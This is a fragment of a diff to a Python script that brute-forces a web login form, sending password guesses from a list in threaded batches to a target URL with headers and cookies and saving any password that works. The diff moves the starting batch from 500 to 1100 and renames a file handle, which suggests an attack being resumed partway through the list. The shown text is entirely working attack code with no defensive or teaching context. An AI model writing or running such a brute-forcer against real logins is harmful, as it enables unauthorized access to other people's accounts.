@@ -65,7 +65,7 @@ if __name__ == "__main__":
     #     main(password_list=password_list[0:10], bruteforce_url=bruteforce_url,
     #     headers=headers, cookies=cookies)
     # )
-    start_index = 500
+    start_index = 1100
     step = 100
     with ThreadPoolExecutor(max_workers=threads) as executor:
         for batch in range(start_index, len(password_list), step):
@@ -89,8 +89,8 @@ if __name__ == "__main__":
                                 thepassword_file.write(response.request.data["pwd"])
                     elif response.status_code == 406:
                         print(f'request {index}: {response.status_code}, probably a timeout')
-                        with open('./failed_requests.txt', 'a+') as thepassword_file:
-                                thepassword_file.write(f"{response.request.data['pwd']}\n")
+                        with open('./failed_requests.txt', 'a+') as failed_passwords_file:
+                                failed_passwords_file.write(f"{response.request.data['pwd']}\n")
                 except Exception as e:
                     print('Looks like something went wrong:', e)
             
